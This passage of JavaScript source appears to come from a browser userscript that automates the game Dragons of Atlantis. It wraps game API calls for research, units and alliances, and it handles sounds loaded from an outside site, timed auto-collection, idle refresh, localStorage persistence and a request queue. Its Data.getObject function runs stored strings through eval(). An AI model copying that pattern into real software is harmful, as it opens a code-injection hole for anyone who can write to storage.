		var url 	= 'reports/battle/'+ options.report_id +'/player/'+ options.member_id + '.json';
		var method	= 'GET';
		
		Data.requests.reports_read.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.errors || r.result.errors || !r.result.success ) {
					Data.requests.reports_read.errors++;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.reports_read.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.alliancereportsRead'
		});
	},
	
	/*
		options
		{
			city_id:
			research_type:
			callback:
		}
	*/
	researches : function ( options )
	{
		var t = MyAjax;

		var p = {};
		p['_method']				 = 'post';
		p['research[research_type]'] = options.research_type;
		
		var url 	= 'cities/'+ options.city_id +'/researches.json';
		var method	= 'POST';
		
		Data.requests.research.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.research.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				Seed.checkAddJob ( r.result.job );
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.research.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.researches'
		});
	},
	
		/*
		options
		{
			city_id   :
			unit_type :
			quantity  :
			callback  :
		}
	*/
	resurrect : function ( options )
	{
		var t = MyAjax;

		var p = {};
		p['_method']		  = 'post';
		p['units[unit_type]'] = options.unit_type;
		p['units[quantity]']  = options.unit_quantity;
		
		var url 	= 'cities/'+ options.city_id +'/units/resurrect.json';
		var method	= 'POST';
		
		Data.requests.resurrect.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.resurrect.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				Seed.checkAddJob ( r.result.job );
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.resurrect.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.resurrect'
		});
	},
	
		/*
		options
		{
			city_id   :
			unit_type :
			quantity  :
			callback  :
		}
	*/
	release : function ( options )
	{
		var t = MyAjax;

		var p = {};
		p['_method']		  = 'delete';
		p['units[unit_type]'] = options.unit_type;
		p['units[quantity]']  = options.unit_quantity;
		
		var url 	= 'cities/'+ options.city_id +'/units/release.json';
		var method	= 'POST';
		
		Data.requests.release.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.release.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				//Seed.checkAddJob ( r.result.job );
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.release.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.release'
		});
	},
	
	
	/*
		options
		{
			city_id:
			unit_type:
			unit_quantity:
			callback:
		}
	*/
	units : function ( options )
	{
		var p = {};
		p['_method']		  = 'post';
		p['units[quantity]']  = options.unit_quantity;
		p['units[unit_type]'] = options.unit_type;
		
		var url 	= 'cities/'+ options.city_id +'/units.json';
		var method	= 'POST';
		
		Data.requests.training.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				
				if ( r.result.errors || !r.result.success ) {
					Data.requests.training.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				Seed.checkAddJob ( r.result.job );
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.training.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.units'
		});
	},

	/*
		options
		{
			city_id:
			job_id:
			callback:
		}
	*/
	cancel_jobs : function ( options )
	{
		var p = {};
		p['_method']		  = 'delete';
		p['job_id'] = options.job_id;
		
		var url 	= 'jobs/' + options.job_id + '.json';
		var method	= 'POST';
		
		//Data.requests.canceljobs.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				
				if ( r.result.city ) {
					Seed.updateCity ( r.result.city );
				}
				
				if ( r.result.errors || !r.result.success ) {
					//Data.requests.canceljobs.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				// Delete the Job
				delete ( Seed.jobs[ options.city_id ][ options.job_id ] );
				
				if ( options.onSuccess ){
					options.onSuccess( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				//Data.requests.canceljobs.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.cancel_jobs'
		});
	},

	/*
		options
		{
			city_id:
			callback:
		}
	*/
	summon : function ( options )
	{
		var p = {};
		
		var url 	= 'cities/'+ options.city_id +'/great_dragon/resurrect_dragon.json';
		var method	= 'POST';
		
		Data.requests.summon.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.summon.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				if ( r.result && r.result.cities ) {
					for (var city_name in r.result.cities) {
						var city = r.result.cities [ city_name ];
						Seed.updateCity(city);
					}
				}
				//Seed.checkAddJob ( r.result.job );
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.summon.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.summon'
		});
	},

	/*
		options
		{
			alliance_id:
			callback:
		}
	*/
	members_alliance : function ( options ){
		var t = MyAjax;

		if (options.alliance_id) {
			var p = {};
			p['count']		  = 120;
			p['approved']	  = 1;
			
			new MyAjax.RequestDOA ({
				url		  : 'alliances/'+options.alliance_id+'/memberships',
				method	  : 'GET',
				params	  : p,
				onSuccess : function(r){
					var ret = {member:[]};
					if (r.alliance_memberships) {
						$J.merge( ret.member, r.alliance_memberships );
					}
					ret.page = r.page;
					ret.total = r.total;
					ret.done = true;
					if (options.onSuccess) {
						options.onSuccess (ret);
					} else if (options.callback) {
						options.callback (ret);
					}
				},
				onFailure : function( r ){
					Data.requests.alliance.errors++;
					if ( options.onFailure ){
						options.onFailure ( r );
					}
				},
				
				delay      : options.delay || 500,
				timeout    : options.timeout || 10000,
				delay_next : options.delay_next || 1,
				caller     : (options.caller || 'unknow') + ', MyAjax.members_alliance'
			});
		}
	},
	
	/*
		options
		{
			callback:
		}
	*/
	alliances : function ( options ) {
		var t = MyAjax;

		var p = {};
		p['sort']			  = 'might';
		p['q']		      = '';
		p['count']	    = 20;
		p['page']			  = options.page || 1;
		
		new MyAjax.RequestDOA ({
			url		  : 'alliances',
			method	  : 'GET',
			params	  : p,
			onSuccess : function(r){
				var ret = {alliances:[], friends:[], foes:[],page:0,total:0};
				if (r.alliances) {
					$J.merge( ret.alliances, r.alliances );
				}
				if (r.friend_ids) {
					$J.merge( ret.friends, r.friend_ids );
				}
				if (r.foe_ids) {
					$J.merge( ret.foes, r.foe_ids );
				}
				ret.page=r.page;
				ret.total=r.total;
				ret.done = true;
				
				if (options.onSuccess) {
					options.onSuccess (ret);
				} else if (options.callback) {
					options.callback (ret);
				}
			},
			onFailure : function( r ){
				Data.requests.alliances.errors++;
				if ( options.onFailure ){
					options.onFailure ( r );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || 'unknow') + ', MyAjax.alliances'
		});

	},

	/*
		options
		{
			alliance_id:
			callback:
		}
	*/
	alliance_activity : function ( options ){
		var t = MyAjax;

		if (options.alliance_id) {
			var p = {};
			p['offset']			= ((options.page || 1) - 1) * 20;
			p['approved']		= 0;
			p['limit']			= 20;
			p['sort']			= 'might';
			
			new MyAjax.RequestDOA ({
				url		  : 'alliances/'+options.alliance_id+'/activity',
				method	  : 'GET',
				params	  : p,
				onSuccess : function(r){
					var ret = {battle:[]};
					if (r.activity) {
						$J.merge(ret.battle,r.activity);
					}
					if (r.activity_total) {
						ret.activity_total = r.activity_total;
					}
					ret.done = true;
					if (options.onSuccess) {
						options.onSuccess (ret);
					} else if (options.callback) {
						options.callback (ret);
					}
				},
				onFailure : function( r ){
					Data.requests.activty.errors++;
					if ( options.onFailure ){
						options.onFailure ( r );
					}
				},
				
				delay      : options.delay || 500,
				timeout    : options.timeout || 10000,
				delay_next : options.delay_next || 1,
				caller     : (options.caller || 'unknow') + ', MyAjax.alliance_activity'
			});
		}
	},
			
}; // END MyAjax

//Didi  : Sound manager
Sound = {
	
	SWF_PLAYER_URL : 'https://wackoscripts.com/mp3/teamwork.swf',
	
	SOUND_PLAYER : [ 'sentinel', 'jobs', 'fortuna'],
	
	DEFAULT_SOUND_URL : { sentinel_2 : 'https://wackoscripts.com/mp3/tower.mp3',
		sentinel_1 : 'https://wackoscripts.com/mp3/spy.mp3',
		jobs_building : 'https://wackoscripts.com/mp3/construction.mp3',
		jobs_units : 'https://wackoscripts.com/mp3/training.mp3',
		jobs_research : 'https://wackoscripts.com/mp3/research.mp3',
		fortuna : 'https://wackoscripts.com/mp3/wheel.mp3' },
	
	init : function () {
		var t = Sound;
		var mainbox = TabsManager.mainbox;

		setUID('TeamWork_SWF_Container');
		
		var container = $id(UID['TeamWork_SWF_Container']);
		if (!container) {
			var container = document.createElement('div');
			container.setAttribute('id', UID['TeamWork_SWF_Container']);
			mainbox.append(container);
		}
		
		
		//for (var i=0;i<t.SOUND_PLAYER.length;i++){
		//	var player = document.createElement('div');
		//	player.setAttribute('id', setUID('TeamWork_Player_'+t.SOUND_PLAYER[i]));
		//	container.append(player);
		//}
	},
	
	PlaySound : function (sound_type,repeat,sound_url) {
		var t = Sound;
		if (!t.DEFAULT_SOUND_URL[sound_type]) return;
		if (typeof repeat == 'undefined') repeat = false;
		
		if (!sound_url) {
			if (!Data.options.sound['URL_'+sound_type]) {
				sound_url = t.DEFAULT_SOUND_URL[sound_type];
			} else {
				sound_url = Data.options.sound['URL_'+sound_type];
			}
		}
		
		var sound_array = sound_type.split('_');
		var sound_player = sound_array[0];
		if (Data.options.sound['disable_'+sound_player]) return;
		
		if (!sound_player || sound_player == '') return;
		
		var flashvars = {
			mp3 : sound_url,
			autoplay : "1"
		};
		
		if (repeat) {
			flashvars.loop = "1";
		};
		
		var params = {
			allowscriptaccess : "always"
		};
		
		var attributes = {};

		setUID('TeamWork_Player_'+sound_player);
		var swf_player = $id(UID['TeamWork_Player_'+sound_player]);
		if (!swf_player) {
			logit('create player '+sound_player+' for '+sound_type);
			var swf_container = $id(UID['TeamWork_SWF_Container']);
			var swf_player = document.createElement('div');
			swf_player.setAttribute('id', UID['TeamWork_Player_'+sound_player]);
			swf_container.appendChild(swf_player);
		}

		swfobject.embedSWF(t.SWF_PLAYER_URL, UID['TeamWork_Player_'+sound_player], "0", "0", "9.0.0", false, flashvars, params, attributes);
	},
	
	StopSound : function (sound_type) {
		var t = Sound;
		if (!t.DEFAULT_SOUND_URL[sound_type] && t.SOUND_PLAYER.indexOf(sound_type)==-1) return;
		var sound_array = sound_type.split('_');
		var sound_player = sound_array[0];
		logit('stop player='+sound_player);
		swfobject.removeSWF(UID['TeamWork_Player_'+sound_player]);
		//$J('#'+UID['TeamWork_Player_'+sound_player]).css('display', 'none');
	},
	
	TurnOff : function ( delay ) {
		setTimeout (function(){
			$J(SWF_OBJECT).externalInterface({                                          
				method:'musicMute',                                           
				error:function(error){ console.log('Error TurnOff Sound: ' + error); }       
			});
		},delay * 1000);
	},
	
	TurnOn : function () {
		$J(SWF_OBJECT).externalInterface({                                          
			method:'musicRestore',                                           
			error:function(error){ console.log('Error TurnOn Sound: ' + error); }       
		});                                                                             
	}
	
}; //END Sound

//Didi  : Internet Ressource manager
WackoScript = {
	
	url_binary_file : [
		{url : 'https://wackoscripts.com/icons.png', load_timer : null},
		{url : 'https://wackoscripts.com/iconimages.png', load_timer : null},
		{url : 'https://wackoscripts.com/icons.png', load_timer : null},
		{url : 'https://wackoscripts.com/bg.png', load_timer : null},
		{url : Sound.SWF_PLAYER_URL, load_timer : null},
		{url : Sound.DEFAULT_SOUND_URL.sentinel_2, load_timer : null},
		{url : Sound.DEFAULT_SOUND_URL.sentinel_1, load_timer : null},
		{url : Sound.DEFAULT_SOUND_URL.jobs_building, load_timer : null},
		{url : Sound.DEFAULT_SOUND_URL.jobs_units, load_timer : null},
		{url : Sound.DEFAULT_SOUND_URL.jobs_research, load_timer : null},
		{url : Sound.DEFAULT_SOUND_URL.fortuna, load_timer : null},
	],
		
	init : function () {
		var t=WackoScript;
		for (var type in Data.options.sound) {
			if (/URL_/.test(type)) {
				t.url_binary_file.push({url : Data.options.sound[type], load_timer : null});
			}
		}
		for (var i=0;i<t.url_binary_file.length;i++) {
			t.url_binary_file[i].load_timer = setTimeout(t.LoadBinary,1000,t.url_binary_file[i].url,i);
		}
	},     
	
	LoadBinary : function(url,index) {
		var t=WackoScript;
		
		var p = {};		
		var method	= 'GET';
		
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			binary    : true,
			nonapi    : true,
			
			onSuccess : function( r ) {
				logit('url '+url+' is ok');
			},
			
			onFailure : function( r ) {
				clearTimeout(t.url_binary_file[index].load_timer); t.url_binary_file[index].load_timer = null;
				t.url_binary_file[index].load_timer = setTimeout(t.LoadBinary,5000,url,index);
			},
			
			delay      : 500,
			timeout    : 10000,
			delay_next : 1,
			caller     : 'WackoScript.LoadBinary'
		});

	},
		
}; //END WackoScript

// Added the autocollection interval from the select menu
AutoCollect = {

	init : function () 
	{
		var t = AutoCollect;
		t.setEnable ( Data.options.auto_collect.enabled );
	},
	
	setEnable : function ( on_off ) 
	{
		var t = AutoCollect;
		clearTimeout (t.timer); t.timer=null;
		Data.options.auto_collect.enabled = on_off;
		if ( on_off )
		{
			var time = (Data.options.auto_collect.delay * Data.options.auto_collect.unit) - serverTime() + Data.options.auto_collect.last_time;
			if ( time <= 0 ) {
				t.doit ();
			} 
			else {
				t.timer = setTimeout ( t.doit, time * 1000 );
			}
		}
	},
	
	doit : function ()
	{
		var t = AutoCollect;
		Data.options.auto_collect.last_time = serverTime();
		
		function collect ( city_idx, delay )
		{
			setTimeout (function(){
				MyAjax.moveResources ({
					city_id   : Seed.cities[city_idx].id,
					onSuccess : function(){
						actionLog (translate('Auto-Collection of Resources') + ' ' + translate('Outpost') + ' #' + city_idx);
					},
					onFailure : function( r ){
						actionLog (translate('Auto-Collection of Resources') + ' ' + translate('Outpost') + ' #' + city_idx + ' Failure');
					},
					caller : 'AutoCollect.doit'
				});
				
			}, delay);
		}

		for ( var city_idx = 1; city_idx < Seed.cities.length; city_idx++ )
		{
			// in case the city is not been defined in Seed.updateCity skip to next in array.
			// also, skip Spectral Dragon Outpost
			if ( !Seed.cities[city_idx] || city_idx == OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] || city_idx == OUTPOST_TYPE_INDEX['SkythroneOutpost'] )
			{
				continue;
			}
			
			collect ( city_idx, city_idx * 30000 );
		}
		
		var delay_time = ((Data.options.auto_collect.delay * Data.options.auto_collect.unit) + (Math.random()*120))*1000;
		
		t.timer = setTimeout (t.doit, delay_time);

	}
}; // END Auto Collect

AutoRefresh = {
	timer   : null,
	current_mouse : [0,0],
	last_mouse : [0,0],
	last_time : 0,
	
	init : function () 
	{
		var t = AutoRefresh;
		
		// fix old value settings
		if ( Data.options.auto_refresh.delay < 30 ) {
			Data.options.auto_refresh.delay = Data.options.auto_refresh.delay * 60;
		}
		
		t.setEnable ( Data.options.auto_refresh.enabled );
	},
	
	setEnable : function ( on_off ) 
	{
		var t = AutoRefresh;
		Data.options.auto_refresh.enabled = on_off;
		if ( Data.options.auto_refresh.enabled )
		{
			t.last_time = parseInt( serverTime() );
			window.addEventListener('mousemove', t.onMouseMove, false);
			t.onTimeout();
		} 
		else {
			window.removeEventListener('mousemove', t.onMouseMove, false);
		}
	},
	
	setDelay : function ( minutes ) 
	{
		var t = AutoRefresh;
		Data.options.auto_refresh.delay = minutes * 60;
	},
	
	onMouseMove : function ( event )
	{
		AutoRefresh.current_mouse = [event.clientX, event.clientY];
	},
	
	onTimeout : function ()
	{
		var t = AutoRefresh;
		clearTimeout( t.timer ); t.timer=null;
		
		if ( t.current_mouse.join() !== t.last_mouse.join() ) 
		{
			t.last_time = parseInt( serverTime() );
			t.last_mouse = [].concat( t.current_mouse );
		}
		
	
		if ( parseInt(serverTime()) - t.last_time > Data.options.auto_refresh.delay)
		{
			t.last_time = parseInt( serverTime() );
			$J('#container').toggle().toggle();
		}
		
		
		if ( Data.options.auto_refresh.enabled )
		{
			t.timer = setTimeout( t.onTimeout, 30000 );
		}
	}
};// END AutoRefresh


Buildings = {

	building_capital: ['Home', 'Garrison', 'ScienceCenter', 'Metalsmith', 'OfficerQuarter', 'MusterPoint', 'Rookery', 'StorageVault', 'Theater', 'Sentinel', 'Factory', 'Fortress', 'DragonKeep', 'Wall'],
	
	building_outpost: ['TrainingCamp', 'Home', 'Silo', 'MusterPoint', 'DragonKeep', 'Wall'],
	
	building_field	: ['Mine', 'Farm', 'Lumbermill', 'Quarry'],
	
	building_outpost_spectral: ['Mausoleum', 'DarkPortal','SpectralDragonKeep'],
	
	building_field_spectral: ['EnergyCollector'],
	
	building_outpost_skythrone : ['Cathedral','Forge','Greenhouse','KaiserDragonKeep','Library','Workshop'],

	getBuildingList : function ( city_idx )
	{
		var t = Buildings;
		var list = [];
		switch ( city_idx )
		{
		case 0 :
			list = t.building_field.concat([false],t.building_capital);
			break;
		case OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] :
			list = t.building_field_spectral.concat([false],t.building_outpost_spectral);
			break;
		case OUTPOST_TYPE_INDEX['SkythroneOutpost'] :
			list = t.building_outpost_skythrone;
			break;
		default :
			list = t.building_field.concat([false],t.building_outpost);
			break;
		}	
		return list;	
	},
	// now includes check_cap (optional)
	getList : function ( city_idx, build_type, check_cap )
	{
		var ret = [];
		var build_cap = Data.options.building.level_cap[city_idx];
		for (var i=0; i < Seed.cities[ city_idx ].buildings.length; i++)
		{
			if ( Seed.cities[ city_idx ].buildings[i].type === build_type &&
			     ( !check_cap || ( check_cap && Seed.cities[ city_idx ].buildings[i].level < (build_cap[ build_type ] || 9) ) )
			 ){
				ret.push ( Seed.cities[ city_idx ].buildings[i] );
			}
		}
		return ret;
	},
	// Given the city index number and the building type, returns the
	// lowest and higher level building of the specified type or 
	// zero if the building is not found (may not have been built)
	// Return an object with min and max levels
	getLevel : function ( city_idx, build_type )
	{
		var build_list = Buildings.getList( city_idx, build_type );
		if ( build_list.length < 1 ){
			return { min:0, max:0 };
		}
		build_list.sort( function(a,b){return a.level - b.level;} );
		return { min: build_list[0].level, max: build_list[build_list.length-1].level };
	},
	
	getById : function ( city_idx, build_id )
	{
		for (var i=0; i < Seed.cities[ city_idx ].buildings.length; i++)
		{
			if ( Seed.cities[ city_idx ].buildings[i].id === build_id ) {
				return ( Seed.cities[ city_idx ].buildings[i] );
			}
		}
		return null;
	},
	
	setLevel : function ( city_id, build_id, level )
	{
		var city_idx = Seed.city_idx[ city_id ];
		for (var i=0; i < Seed.cities[ city_idx ].buildings.length; i++)
		{
			if ( Seed.cities[ city_idx ].buildings[i].id === build_id ) {
				Seed.cities[ city_idx ].buildings[i].level = level;
			}
		}
		Tabs.Jobs.building.refreshBuilding = false;
		return null;
	},
}; // END Building



Data = {
	logs		: [ [], [], [] ],
	defaults	: {},
	
	init : function ( obj )
	{
		try {
		
			//Saves defaults properties
			Data.defaults.mergeWith( obj || {} );
			
			for ( var name in obj )
			{
				// Checks if the object is already defined in the Data Object
				if ( typeof( Data[name] ) == 'undefined' ) {
					//  Assign default object properties, if defined, otherwise an empty object
					Data[name] = typeof( obj[name] ) != 'undefined' ? obj[name].cloneProps() : {};
				}
				
				// Load the data stored, of the current item from localStorage
				var stored = Data.getObject( name );
				
				// Clean removed values from stored object ( max depth 2 )
				if ( stored != null && typeof ( stored ) == 'object' ) {
					debugLog ( 'Clean Removed Vars from : [ ' + name + ' ]' );
					stored.cleanRemoved ( Data [name], 1 );
				}
				
				// Check if the default object is really an object
				if ( Data[name] != null && typeof( Data[name] ) == 'object' )
				{
					// Assign the properties of stored objeto into the default object, overwriting the values
					Data[name].mergeWith( stored );
				}
				//else if ( stored !== '' ) {
				else {
					Data[name] = stored;
				}
			}
		} catch (e) {
			alert ('This browser does not support LocalStorage\n\n'+e);
			return false;
		}
	},
	
	clearStorage : function( names )
	{
		var pattern = names ? new RegExp ( '(' + names.join('|') + ')' ) : false;

		var keys = getKeys ( Data.defaults );
		for ( var i=0; i < keys.length; i++ )
		{
			if ( !names || ( names && pattern.test ( keys[i] ) ) ) {
				Data[ keys[i] ] = Data.defaults[ keys[i] ].cloneProps();
			}
		}
		actionLog('localStorage Deleted!');
	},
	
	getObject : function ( name )
	{
		var item = localStorage.getItem( [SCRIPT_ID, SERVER_ID, USER_ID, name].join('_') );
		return ( item || '' ).charAt(0) === '{' ? JSON.parse( item || '{}' ) : eval( item );
	},
	

	setObject : function( name, value )
	{
		try {
			localStorage.setItem( [SCRIPT_ID, SERVER_ID, USER_ID, name].join('_'), JSON.stringify( value ) );
		} catch(e){
			if ( e.code === 22 && e.name === 'QUOTA_EXCEEDED_ERR' )
			{
				console.log('erreur save localstorage , '+name+'='+value+', error='+inspect(e,8,1));
				alert ( translate('LocalStorage') + ' ' + translate('Quota exceeded') + '!\n\n' + translate('Please, delete the cache and persistent data in your browser'));
			}
		}
	},

	onUnload : function ()
	{
		debugLog('Save Data in localStorage');
		verboseLog('Save Data in localStorage');
		
		var keys = getKeys ( Data.defaults );
		for ( var i=0; i < keys.length; i++ )
		{
			var name = keys[i];
			Data.setObject ( name, Data[name] );
		}
	}
	
	
}; //END Data


/*

 DoA PTT - Queue Center v 0.4

Based on Stephen Morley - http://code.stephenmorley.org/ - and released under
the terms of the CC0 1.0 Universal legal code:

http://creativecommons.org/publicdomain/zero/1.0/legalcode

*/

/* Creates a new queue. A queue is a first-in-first-out (FIFO) data structure -
 * objects are added to the end of the queue and removed from the front.
 */
Queue = {
  // initialise the queue and offset
  queue			: [],
  offset		: 0,	 
  running		: false,
	
  delay			: 2000,  // default delay for every function
  timeout		: 5000,  // default time out for run a function
  
  timer			: 0,     // timer id for the next run
  
  caller        : '',   // save the current caller string ( for debug )

  /* Returns the length of the queue.
   */
  getLength : function()
  {
	var t = Queue;
    // return the length of the queue
    return ( t.queue.length - t.offset );

  },
  
  /* Returns true if the queue is empty, and false otherwise.
   */
  isEmpty : function()
  {
	var t = Queue;
    // return whether the queue is empty
    return ( t.queue.length === 0 );

  },
  
  /* Enqueues the specified obj. The parameter is:
   *
   * The obj to enqueue
   * obj = {
   *		fn        : function to run
   *		args       : arguments of the function
   *		delay      : delay in ms to run the function (optional)
   *		callback   : the callback function (optional)
   *		onSuccess  : onSuccess callback function (optional but recommended)
   *		onFailure  : onFailure callback function (optional but recommended)
   *		timeout    : timeout in ms to go to the next queue if the callback dont do it (optional)
   *		delay_next : delay in ms to run the next queue (optional)
   * }
   */
  add : function( obj )
  {
	var t = Queue;
	
	// set the id of the object
	obj.id = setUID();
	
    // enqueue the object
    t.queue.push( obj );
	if ( Data.options.debug_mode ){
		debugLog( 'queue (' + t.queue.length + ') add: ' + (obj.caller||'unknow') );
		if (!obj.caller || /unknow/.test(obj.caller) ){
			logit('no caller for '+obj.args[0].url + '/' + inspect(obj,8,1));
		}
	}
	
	// if it's the first to be added to the queue, run it
	if ( !t.running && t.queue.length == 1 ) {
		t.next();
	}
	
	// return the id of this queue obj
	return obj.id;

  },
  
   /* Dequeues an obj and returns true. If the queue is empty then undefined is
   * returned.
   */
  remove : function( id ) {
	var t = Queue;

	// if the queue is empty, return undefined
    if ( t.queue.length == 0 ) return undefined;

	// if request to delete a specific queue ID
	if ( id ) {
		// look for the queue id
		for ( var i in t.queue )
		{
			// We find it and remove it
			if ( t.queue[i].id === id ) {
				t.queue.splice( i, 1 );
				break;
			}
		}
	} 
	// increment the offset and remove the free space if necessary
	else if ( ++t.offset * 2 >= t.queue.length ) 
	{
		id = t.queue[t.offset].id;
		t.queue  = t.queue.slice(t.offset);
		t.offset = 0;
    }
	
	// remove the current uid
	if ( UIDN[id] ) {
		delete ( UIDN[id] );
	}
	
    // return true
    return true;

  },

  /* Dequeues an obj and returns it. If the queue is empty then undefined is
   * returned.
   */
  getNext : function() {
	var t = Queue;
    // if the queue is empty, return undefined
    if ( t.queue.length === 0 ) return undefined;

    // store the obj at the front of the queue
    var obj = t.queue[t.offset];

    // increment the offset and remove the free space if necessary
    if ( ++t.offset * 2 >= t.queue.length ){
      t.queue  = t.queue.slice( t.offset );
      t.offset = 0;
    }
	
	// remove the current uid
	if ( UIDN[obj.id] ) {
		delete ( UIDN[obj.id] );
	}
	
	if ( Data.options.debug_mode ) {
		debugLog( 'running : ' + (obj.caller||'unknow') );
	}
	
    // return the dequeued obj
    return obj;

  },
  
  /* Run the obj at the front of the queue & dequeuing it. 
   */
  next : function(){
	var t = Queue;
	
	t.running = true;
	
	// take the fist obj in the queue & dequeuing it
	var obj = t.getNext();
	
	// if the obj is undefined, return false
    if ( !obj ) {
		t.running = false;
		return false;
	}
	
	// save the current caller (for debug)
	t.caller = obj.caller || 'unknow';
	
	// run the obj function in a timeout function
	t.timer = setTimeout( 
		function( self, fn, args, callback, timeout, delay_next ) {
			
			// take the possible callback of the args obj and 
			// insert the order to the next queue & the callback
			var callback_added = false;
			
			// First, Check if the first argument is an object
			if ( args && typeof args[0] === 'object' )
			{
				// check if we have a callback function
				if ( args[0].callback && args[0].callback instanceof Function )
				{
					// store the callback function 
					var obj_callback = args[0].callback;
					// replace the callback function incorporating the stored callback
					args[0].callback = function( r )
					{
						// call the stored callback
						try {
							obj_callback( r );
						} catch(e){
							console.log ('ERROR: Queue: ' + self.caller + ' - obj_callback: '+ e)
						}
						// call the callback of the queue obj ( if there )
						try {
							if ( callback ) callback( r );
						} catch(e){
							console.log ('ERROR: Queue: ' + self.caller + ' - callback: '+ e)
						}
						
						self.running = false;
						// call the next task in the queue
						setTimeout ( self.next, delay_next );
					}
					callback_added = true;
				}
				
				// Check onSuccess and onFailure callbacks
				else {
					// check if we have a onSuccess callback function
					if ( args[0].onSuccess && args[0].onSuccess instanceof Function )
					{
						// store the callback function 
						var success_callback = args[0].onSuccess;
						// replace the callback function incorporating the stored callback
						args[0].onSuccess = function( r )
						{
							// call the stored callback
							//try {
								success_callback( r );
							//} catch(e){
							//	console.log ('ERROR: Queue: ' + self.caller + ' - onSuccess: '+ e)
							//}
							// call the callback of the queue obj ( if there )
							try {
								if ( callback ) callback( r );
							} catch(e){
